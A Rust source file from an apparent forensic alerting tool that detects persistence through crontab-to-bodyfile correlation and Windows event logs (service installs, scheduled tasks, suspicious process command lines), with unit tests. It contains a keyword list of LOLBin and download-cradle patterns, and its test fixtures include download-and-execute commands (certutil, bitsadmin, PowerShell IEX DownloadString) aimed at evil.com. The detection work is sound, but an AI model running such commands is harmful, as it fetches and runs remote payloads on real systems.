//! Persistence mechanism detection heuristics.
//!
//! Covers Linux crontab-to-bodyfile correlation and Windows persistence
//! mechanisms (service installation, scheduled tasks, suspicious process
//! execution from EVTX events).

use issen_parser_uac::parsers::bodyfile::BodyfileEntry;
use issen_parser_uac::parsers::process::CrontabEntry;

use super::types::{Alert, AlertSeverity, WindowsEvent};

/// Detect persistence mechanisms by cross-referencing crontabs with bodyfile.
///
/// Detects:
/// - Crontab scheduling execution of a file in a temp directory,
///   enriched with bodyfile metadata when the payload exists on disk (Critical)
/// - Crontab referencing a temp-dir file that is NOT in the bodyfile,
///   suggesting cleanup after deployment (Warning)
pub(super) fn check_persistence_correlation(
    crontabs: &[CrontabEntry],
    bodyfile: &[BodyfileEntry],
    alerts: &mut Vec<Alert>,
) {
    let temp_prefixes = ["/tmp/", "/dev/shm/", "/var/tmp/"];

    for entry in crontabs {
        // Extract tokens that look like absolute paths in temp directories
        for token in entry.command.split_whitespace() {
            let is_temp_path = temp_prefixes.iter().any(|p| token.starts_with(p));
            if !is_temp_path {
                continue;
            }
            // Strip trailing shell operators (;, &&, |, etc.)
            let path = token.trim_end_matches(|c: char| {
                !c.is_alphanumeric() && c != '/' && c != '.' && c != '_' && c != '-'
            });

            if let Some(bf) = bodyfile.iter().find(|b| b.path == path) {
                alerts.push(Alert {
                    severity: AlertSeverity::Critical,
                    category: "correlation".into(),
                    message: format!("Crontab persistence: scheduled execution of {path}"),
                    detail: format!(
                        "user={} schedule={} | file: size={} mode={} mtime={}",
                        entry.user,
                        entry.schedule,
                        bf.size,
                        bf.mode,
                        bf.mtime.unwrap_or(0)
                    ),
                });
            } else {
                alerts.push(Alert {
                    severity: AlertSeverity::Warning,
                    category: "correlation".into(),
                    message: format!("Crontab references missing temp file: {path}"),
                    detail: format!(
                        "user={} schedule={} cmd={} | file not found in bodyfile",
                        entry.user, entry.schedule, entry.command
                    ),
                });
            }
            break; // Only flag first temp path per crontab entry
        }
    }
}

/// Windows persistence mechanism detection from Security and System logs.
///
/// Detects new service installations (7045), scheduled task creation (4698),
/// and suspicious process execution patterns (4688) matching SIGMA rules.
pub(super) fn check_windows_persistence(events: &[WindowsEvent], alerts: &mut Vec<Alert>) {
    /// Paths that are suspicious for service binaries or scheduled task targets.
    const SUSPICIOUS_SERVICE_PATHS: &[&str] = &[
        "\\temp\\",
        "\\tmp\\",
        "\\appdata\\",
        "\\public\\",
        "\\perflogs\\",
        "\\programdata\\",
        "\\users\\default\\",
        "\\windows\\temp\\",
        "\\recycle",
        "\\downloads\\",
    ];

    /// Command patterns associated with living-off-the-land (LOLBins)
    /// or post-exploitation frameworks.
    const SUSPICIOUS_CMD_PATTERNS: &[&str] = &[
        "powershell",
        "-encodedcommand",
        "-enc ",
        "-e ",
        "-ec ",
        "frombase64string",
        "invoke-expression",
        "iex(",
        "iex ",
        "downloadstring",
        "certutil",
        "bitsadmin",
        "mshta",
        "regsvr32",
        "rundll32",
        "wmic process",
        "cmd /c",
        "cmd.exe /c",
    ];

    for event in events {
        match event.event_id {
            // New Windows service installed (SIGMA: `7036b439`)
            7045 => {
                let desc_lower = event.description.to_lowercase();
                let suspicious_path = SUSPICIOUS_SERVICE_PATHS
                    .iter()
                    .any(|p| desc_lower.contains(p));

                let severity = if suspicious_path {
                    AlertSeverity::Critical
                } else {
                    AlertSeverity::Warning
                };

                alerts.push(Alert {
                    severity,
                    category: "windows-persistence".into(),
                    message: format!(
                        "New service installed (EventID:7045){}",
                        if suspicious_path {
                            " — suspicious path"
                        } else {
                            ""
                        }
                    ),
                    detail: format!(
                        "source: SIGMA 7036b439 | computer={} | {}",
                        if event.computer.is_empty() {
                            "unknown"
                        } else {
                            &event.computer
                        },
                        event.description
                    ),
                });
            }
            // Scheduled task created (SIGMA: `4698 detection`)
            4698 => {
                alerts.push(Alert {
                    severity: AlertSeverity::Warning,
                    category: "windows-persistence".into(),
                    message: format!(
                        "Scheduled task created (EventID:4698) on {}",
                        if event.computer.is_empty() {
                            "unknown"
                        } else {
                            &event.computer
                        }
                    ),
                    detail: event.description.clone(),
                });
            }
            // Process creation — look for suspicious command lines
            4688 => {
                let desc_lower = event.description.to_lowercase();
                let suspicious = SUSPICIOUS_CMD_PATTERNS
                    .iter()
                    .any(|p| desc_lower.contains(p));

                if suspicious {
                    alerts.push(Alert {
                        severity: AlertSeverity::Warning,
                        category: "windows-persistence".into(),
                        message: "Suspicious process execution (EventID:4688)".into(),
                        detail: format!(
                            "computer={} | {}",
                            if event.computer.is_empty() {
                                "unknown"
                            } else {
                                &event.computer
                            },
                            event.description
                        ),
                    });
                }
            }
            _ => {}
        }
    }
}

#[cfg(test)]
mod tests {
    use super::super::engine::detect_alerts;
    use super::super::types::AlertInput;
    use super::super::types::AlertSeverity;
    use super::*;

    fn empty_input() -> AlertInput<'static> {
        AlertInput {
            bodyfile: &[],
            network: &[],
            processes: &[],
            crontabs: &[],
            chkrootkit: &[],
            rootkit_findings: &[],
            configs: &[],
            hashes: &[],
            packages: &[],
            logins: &[],
            windows_events: &[],
            mft_entries: &[],
            connection_log: &[],
        }
    }

    fn winevt(event_id: u64, desc: &str) -> WindowsEvent {
        WindowsEvent {
            event_id,
            channel: "Security".into(),
            provider: "Microsoft-Windows-Security-Auditing".into(),
            computer: "WORKSTATION01".into(),
            timestamp: 1_700_000_000,
            description: desc.into(),
        }
    }

    // --- Linux crontab persistence tests ---

    #[test]
    fn crontab_tmp_file_in_bodyfile_critical() {
        let crontabs = vec![CrontabEntry {
            schedule: "*/5 * * * *".into(),
            command: "/tmp/updater.sh".into(),
            user: "root".into(),
        }];
        let bodyfile = vec![BodyfileEntry {
            md5: String::new(),
            path: "/tmp/updater.sh".into(),
            inode: 500,
            mode: "100755".into(),
            uid: 0,
            gid: 0,
            size: 2048,
            atime: None,
            mtime: Some(1_700_000_000),
            ctime: None,
            crtime: None,
        }];
        let input = AlertInput {
            crontabs: &crontabs,
            bodyfile: &bodyfile,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts.iter().any(|a| a.severity == AlertSeverity::Critical
                && a.category == "correlation"
                && a.message.contains("persistence")
                && a.detail.contains("size=2048")),
            "expected persistence alert with bodyfile enrichment, got: {alerts:?}"
        );
    }

    #[test]
    fn crontab_tmp_file_missing_from_bodyfile_warning() {
        let crontabs = vec![CrontabEntry {
            schedule: "*/5 * * * *".into(),
            command: "/tmp/ghost.sh".into(),
            user: "root".into(),
        }];
        let input = AlertInput {
            crontabs: &crontabs,
            bodyfile: &[], // empty bodyfile — file not found
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts.iter().any(|a| a.category == "correlation"
                && a.message.contains("missing")
                && a.message.contains("/tmp/ghost.sh")),
            "expected missing temp file alert, got: {alerts:?}"
        );
    }

    #[test]
    fn crontab_normal_command_no_persistence_alert() {
        let crontabs = vec![CrontabEntry {
            schedule: "0 2 * * *".into(),
            command: "/usr/bin/logrotate /etc/logrotate.conf".into(),
            user: "root".into(),
        }];
        let input = AlertInput {
            crontabs: &crontabs,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            !alerts
                .iter()
                .any(|a| a.category == "correlation" && a.message.contains("persistence")),
            "should not flag normal logrotate crontab, got: {alerts:?}"
        );
    }

    // --- Windows persistence tests ---

    #[test]
    fn win_persist_service_install_warning() {
        let events = vec![winevt(
            7045,
            "ServiceName=LegitService ImagePath=C:\\Program Files\\svc.exe",
        )];
        let input = AlertInput {
            windows_events: &events,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts.iter().any(|a| a.severity == AlertSeverity::Warning
                && a.category == "windows-persistence"
                && a.message.contains("service installed")
                && a.message.contains("7045")),
            "expected service install warning, got: {alerts:?}"
        );
    }

    #[test]
    fn win_persist_service_suspicious_path_critical() {
        let events = vec![winevt(
            7045,
            "ServiceName=EvilSvc ImagePath=C:\\Users\\Public\\evil.exe",
        )];
        let input = AlertInput {
            windows_events: &events,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts.iter().any(|a| a.severity == AlertSeverity::Critical
                && a.category == "windows-persistence"
                && a.message.contains("suspicious path")),
            "expected critical for suspicious service path, got: {alerts:?}"
        );
    }

    #[test]
    fn win_persist_service_temp_path_critical() {
        let events = vec![winevt(
            7045,
            "ServiceName=Backdoor ImagePath=C:\\Windows\\Temp\\payload.exe",
        )];
        let input = AlertInput {
            windows_events: &events,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.severity == AlertSeverity::Critical
                    && a.message.contains("suspicious path")),
            "expected critical for temp service path, got: {alerts:?}"
        );
    }

    #[test]
    fn win_persist_service_appdata_critical() {
        let events = vec![winevt(
            7045,
            "ImagePath=C:\\Users\\victim\\AppData\\Local\\svc.exe",
        )];
        let input = AlertInput {
            windows_events: &events,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.severity == AlertSeverity::Critical
                    && a.message.contains("suspicious path")),
            "expected critical for appdata service path, got: {alerts:?}"
        );
    }

    #[test]
    fn win_persist_scheduled_task_warning() {
        let events = vec![winevt(4698, "TaskName=\\EvilTask")];
        let input = AlertInput {
            windows_events: &events,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts.iter().any(|a| a.severity == AlertSeverity::Warning
                && a.category == "windows-persistence"
                && a.message.contains("Scheduled task created")
                && a.message.contains("4698")),
            "expected scheduled task warning, got: {alerts:?}"
        );
    }

    #[test]
    fn win_persist_process_powershell_enc_warning() {
        let events = vec![winevt(
            4688,
            "NewProcessName=powershell.exe CommandLine=powershell -EncodedCommand SQBFAF...",
        )];
        let input = AlertInput {
            windows_events: &events,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts.iter().any(|a| a.severity == AlertSeverity::Warning
                && a.category == "windows-persistence"
                && a.message.contains("Suspicious process")),
            "expected suspicious process for encoded powershell, got: {alerts:?}"
        );
    }

    #[test]
    fn win_persist_process_certutil_warning() {
        let events = vec![winevt(
            4688,
            "NewProcessName=certutil.exe CommandLine=certutil -urlcache -split -f http://evil.com/p.exe",
        )];
        let input = AlertInput {
            windows_events: &events,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.message.contains("Suspicious process")),
            "expected suspicious process for certutil, got: {alerts:?}"
        );
    }

    #[test]
    fn win_persist_process_bitsadmin_warning() {
        let events = vec![winevt(
            4688,
            "CommandLine=bitsadmin /transfer evil http://evil.com/file c:\\temp\\file",
        )];
        let input = AlertInput {
            windows_events: &events,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.message.contains("Suspicious process")),
            "expected suspicious process for bitsadmin, got: {alerts:?}"
        );
    }

    #[test]
    fn win_persist_process_normal_not_flagged() {
        let events = vec![winevt(
            4688,
            "NewProcessName=notepad.exe CommandLine=notepad.exe C:\\Users\\docs\\file.txt",
        )];
        let input = AlertInput {
            windows_events: &events,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            !alerts
                .iter()
                .any(|a| a.category == "windows-persistence"
                    && a.message.contains("Suspicious process")),
            "normal process should not trigger, got: {alerts:?}"
        );
    }

    #[test]
    fn win_persist_process_mshta_warning() {
        let events = vec![winevt(
            4688,
            "CommandLine=mshta vbscript:Execute(\"CreateObject...\")",
        )];
        let input = AlertInput {
            windows_events: &events,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.message.contains("Suspicious process")),
            "expected suspicious process for mshta, got: {alerts:?}"
        );
    }

    #[test]
    fn win_persist_iex_downloadstring_warning() {
        let events = vec![winevt(
            4688,
            "CommandLine=powershell IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')",
        )];
        let input = AlertInput {
            windows_events: &events,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.message.contains("Suspicious process")),
            "expected suspicious for IEX+DownloadString, got: {alerts:?}"
        );
    }
}
